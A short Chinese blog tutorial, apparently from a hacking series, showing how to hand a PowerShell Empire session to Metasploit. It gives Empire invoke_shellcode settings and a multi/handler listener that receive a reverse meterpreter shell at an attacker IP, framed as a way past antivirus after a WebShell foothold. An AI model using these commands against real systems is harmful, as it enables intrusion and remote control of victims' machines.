---
layout: post
category: binghe-code-hack
title: Empire 反弹回 Metasploit
tagline: by 冰河
tag: [hack,binghe-code-hack]
excerpt: Empire 反弹回 Metasploit
lock: need
---

# Empire 反弹回 Metasploit

在实际渗透中，当拿到WebShell上传的MSF客户端无法绕过目标主机的杀毒软件时，可以使用PowerShell来绕过，也可以执行Empire的Payload来绕过，成功之后再使用Empiore的模块将其反弹回Metasploit。 这里使用Empire的usemodule code_execution/invoke_shellcode模块修改两个参数：Lhost、Lport。将Lhost修改为MSF所在主机的IP，按以下命令设置：

```
set Lhost 192.168.31.247
set Lport 4444
```

![img](https://img-blog.csdnimg.cn/2019010920450179.jpg)

在MSF上设置监听，命令如下：

```
use exploit/multi/handler
set payload windows/meterpreter/reverse_https
set lhost 192.168.31.247
set lport 4444
run
```

运行后，就可以收到Empire反弹回来的Shell

![img](https://img-blog.csdnimg.cn/20190109204848442.jpg)

# 写在最后

> 如果你觉得冰河写的还不错，请微信搜索并关注「 **冰河技术** 」微信公众号，跟冰河学习高并发、分布式、微服务、大数据、互联网和云原生技术，「 **冰河技术** 」微信公众号更新了大量技术专题，每一篇技术文章干货满满！不少读者已经通过阅读「 **冰河技术** 」微信公众号文章，吊打面试官，成功跳槽到大厂；也有不少读者实现了技术上的飞跃，成为公司的技术骨干！如果你也想像他们一样提升自己的能力，实现技术能力的飞跃，进大厂，升职加薪，那就关注「 **冰河技术** 」微信公众号吧，每天更新超硬核技术干货，让你对如何提升技术能力不再迷茫！


![](https://img-blog.csdnimg.cn/20200906013715889.png)